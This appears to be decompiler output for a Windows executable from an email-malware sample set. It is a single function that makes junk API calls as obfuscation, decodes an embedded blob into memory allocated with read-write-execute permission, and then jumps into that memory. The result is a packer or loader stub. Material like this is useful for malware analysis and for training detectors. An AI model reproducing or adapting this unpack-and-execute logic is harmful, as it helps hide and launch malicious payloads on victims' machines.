// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1206/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004012F8(word32 edx, word32 ebp, word32 dwArg00, word32 dwArg01, word32 dwArg05, word32 dwArg0B)
{
// def fp
// def dwArg00
// def dwArg01
// def dwLoc0120
// def dwLocB8
// def dwLoc0180
// def dwLoc03
// def dwLoc0154
// def dwLoc01B4
// def dwArg0B
// def dwLoc010E
// def dwLoc0118
// def dwLoc4C
// def dwLoc8C
// def dwLoc0234
// def dwLocBD
// def dwLocC3
// def dwLoc0225
// def dwLoc021C
// def dwLoc0227
// def dwLoc0140
// def dwArg05
	eax_7 = GetCurrentProcessId();
	if (eax_7 != 0x000003FB)
		;
	dwLoc0268_28 = fp - 0x00000004;
	v15_29 = fp - 0x00000098;
	dwLoc0268_30 = fp - 0x00000098;
	CharUpperA(fp - 0x00000098);
	ecx_36 = &fp->dwFFFFFD98;
	dwLoc0268_38 = &fp->dwFFFFFD98;
	dwLoc026C_41 = 0x00000000;
	dwLoc0270_43.u0 = 0x00000000;
	OpenEventW(0x00000000, 0x00000000, &fp->dwFFFFFD98);
	dwLoc0268_52 = 0x00000000;
	GetDC(0x00000000);
	eax_55 = GetCurrentThreadId();
	if (eax_55 == 0x0000026D)
		ecx_595 = &fp->dwFFFFFD98 ^ dwArg05;
// ecx_64 = PHI(ecx_36, ecx_595)
	esp_68 = fp - 0x00000268;
	fp->dwFFFFFD98 = 0x00000002;
	if (ecx_64 != 0x00000000)
		;
	__set_app_type();
	dwLoc026C_85 = fp - 0x00000004;
	v20_86 = fp - 0x000000B4;
	dwLoc026C_87 = fp - 0x000000B4;
	GetFileAttributesA(fp - 0x000000B4);
	dwLoc026C_92 = &fp->dwFFFFFD98;
	CharUpperA(&fp->dwFFFFFD98);
	GetProcessHeap();
	dwLoc026C_98 = &fp->dwFFFFFD98;
	eax_99 = CharUpperA(&fp->dwFFFFFD98);
	dwLoc026C_107 = &fp->dwFFFFFD98;
	esp_108 = &fp->tFFFFFD90;
	fp->tFFFFFD90.u0 = 0x00000000;
	eax_110 = eax_99 & 0x00000008;
	dwLoc0274_112 = eax_99 & 0x00000008;
	eax_113 = OpenMutexA(eax_99 & 0x00000008, 0x00000000, &fp->dwFFFFFD98);
	ecx_115 = &fp->dwFFFFFD98 & 0x0000011C;
	eax_118 = eax_113 - dwArg00;
	ecx_120 = ecx_115 - dwArg01;
	dwLoc026C_122 = eax_118;
	IsWindow(eax_118);
	v22_126 = dwLoc0120 - (fp - 0x00000004);
	dwLoc0120_127 = v22_126;
	edx_128 = fp - 0x00000004 ^ 0x00000611;
	eax_129 = GetCurrentThreadId();
	eax_130 = eax_129 & 0x00000AE4;
	if ((eax_129 & 0x00000AE4) != ecx_120)
	{
		edx_564 = edx_128 | ecx_120;
		ecx_566 = ecx_120 | dwLoc0140;
		v25_570 = dwLocB8 + ecx_566;
		dwLocB8_571 = v25_570;
		ecx_572 = fp - 0x00000004;
	}
// dwLocB8_142 = PHI(dwLocB8, dwLocB8_571)
// ecx_143 = PHI(ecx_120, ecx_572)
// edx_144 = PHI(edx_128, edx_564)
	dwLoc026C_148 = fp - 0x00000004;
	v26_149 = fp - 0x00000060;
	dwLoc026C_150 = fp - 0x00000060;
	esp_151 = &fp->tFFFFFD90;
	fp->tFFFFFD90.u0 = 0x00000000;
	eax_153 = GetClientRect(0x00000000, fp - 0x00000060);
	eax_156 = eax_153 | dwLoc0180;
	if (eax_156 != edx_144)
	{
		eax_552 = &fp->dwFFFFFD98;
		edx_556 = edx_144 ^ dwLoc0225;
		edx_558 = edx_556 ^ dwLoc021C;
		edx_560 = edx_558 & dwLoc0227;
	}
// edx_165 = PHI(edx_144, edx_560)
// eax_166 = PHI(eax_156, eax_552)
	edx_169 = edx_165 ^ 0x000021CD;
	SCZO_170 = cond(eax_166 - edx_169);
	C_173 = SCZO_170;
	if (eax_166 != edx_169)
	{
		edx_534 = edx_169 * 0x00000002 + (eax_166 <u edx_169);
		ecx_535 = ecx_143 + v22_126;
		eax_542 = eax_166 - 0x00003421;
		SCZO_545 = cond(eax_542);
		C_548 = SCZO_545;
	}
// ecx_179 = PHI(ecx_143, ecx_535)
// edx_180 = PHI(edx_169, edx_534)
// eax_181 = PHI(eax_166, eax_542)
// C_182 = PHI(C_173, C_548)
	esp_183 = &fp->tFFFFFD90;
	fp->tFFFFFD90.u0 = 0x00000000;
	eax_185 = eax_181 + edx_180 + C_182;
	if (eax_185 == 0x00000330)
	{
		edx_530 = edx_180 ^ 0x00001DF0;
		ecx_531 = ecx_179 - 0x0000292F;
	}
// ecx_193 = PHI(ecx_179, ecx_531)
// edx_194 = PHI(edx_180, edx_530)
	dwLoc0274_197 = 0x00000000;
	eax_198 = CreateItemMoniker(0x00000000, 0x00000000, null);
	eax_200 = eax_198 ^ 0x80070057;
	if ((eax_198 ^ 0x80070057) == 0x00000000)
	{
		eax_271 = (eax_198 ^ 0x80070057) + edx_194;
		if (eax_271 == 0x00000000)
		{
			edx_521 = &fp->dwFFFFFD98;
			eax_522 = eax_271 - dwLocB8_142;
			ecx_525 = ecx_193 & dwLocBD;
			ecx_527 = ecx_525 - dwLocC3;
		}
// ecx_278 = PHI(ecx_193, ecx_527)
// edx_279 = PHI(edx_194, edx_521)
// eax_280 = PHI(eax_271, eax_522)
		esp_281 = &fp->dwFFFFFD94;
		fp->dwFFFFFD94 = eax_280;
		esp_283 = &fp->tFFFFFD90;
		fp->tFFFFFD90 = ecx_278;
		esp_285 = &fp->dwFFFFFD8C;
		fp->dwFFFFFD8C = edx_279;
		ecx_299 = ecx_278 & 0x00002F37;
		ecx_305 = ecx_299 + dwLoc03;
		if (fp - 0x00000004 != ecx_305)
			ecx_508 = &fp->dwFFFFFD98;
// ecx_316 = PHI(ecx_305, ecx_508)
		if (ecx_316 != 0x00000000)
			;
		dwLoc0294_329 = 0x00002000;
		dwLoc0298_334 = 0x00000000;
		eax_337 = VirtualAlloc(0x00000000, 0x00002000, 0x00001000, 0x00000040);
		dwLoc0218_340 = eax_337;
		if (dwLoc0154 == ecx_316)
		{
			ecx_487 = ecx_316 + 0x00001D56;
			ecx_491 = ecx_487 ^ 0x00002863;
		}
// ecx_350 = PHI(ecx_316, ecx_491)
		ecx_354 = ecx_350 - dwLoc01B4;
		ecx_358 = ecx_354 | dwArg0B;
		eax_361 = fp - 0x00000004 ^ dwLoc010E;
		eax_363 = eax_361 + dwLoc0118;
		edi_365 = &globals->dw412E33;
		ecx_366 = ecx_358 + eax_363;
		esi_367 = eax_337;
		edx_370 = fp + 0xFFFFDB3F;
		dwLoc68_371 = 0xA37A6ED7;
		ecx_372 = ecx_366 - 0x000028C3;
		if (ecx_366 != 0x000028C3)
		{
			ecx_475 = ecx_366 - 0x000028C3 | 0x000028C3;
			goto l00401606;
		}
l00401606:
		do
		{
// dwLoc68_378 = PHI(dwLoc68_371, dwLoc68_371, dwLoc68_393)
// edi_382 = PHI(edi_365, edi_365, edi_413)
// esi_383 = PHI(esi_367, esi_367, esi_415)
// ecx_384 = PHI(ecx_372, ecx_475, ecx_402)
// edx_385 = PHI(edx_370, edx_370, edx_414)
// eax_386 = PHI(eax_363, eax_363, eax_424)
			ebx_388 = *edi_382;
			ecx_390 = ecx_384 ^ dwLoc4C;
			ebx_391 = ebx_388 + dwLoc68_378;
			v44_392 = dwLoc68_378 + 0x623ED7F6;
			dwLoc68_393 = v44_392;
			ecx_394 = ecx_390 & edx_385;
			C_395 = false;
			edx_396 = edx_385 - eax_386;
			Mem397[esi_383 + 0x00000000:word32] = ebx_391;
			eax_398 = eax_386 | 0x00002279;
			edi_400 = edi_382 + 20138706;
			ecx_402 = ecx_394 - dwLoc8C;
			esi_404 = esi_383 + 0xA596E2A8;
			if (eax_398 == 0x000003EF)
			{
				eax_466 = eax_398 | 0x000038A7;
				edx_468 = &fp->dwFFFFFD98 - ecx_402;
				eax_469 = (eax_398 | 0x000038A7) & 0x00003565;
			}
// edx_410 = PHI(edx_396, edx_468)
// eax_412 = PHI(eax_398, eax_469)
			edi_413 = edi_400 + 0x04CD2B4C;
			edx_414 = edx_410 + 0x00003BBE;
			esi_415 = esi_404 + 0x5A691D5C;
			if ((dwLoc0234 & ecx_402) != 0x00000000)
				eax_461 = eax_412 ^ 0x000034ED;
// eax_424 = PHI(eax_412, eax_461)
		} while (edi_413 != &globals->dw413EBF);
		dwLoc0218_340();
		if (eax_424 == edx_414)
			;
	}
	return;
}

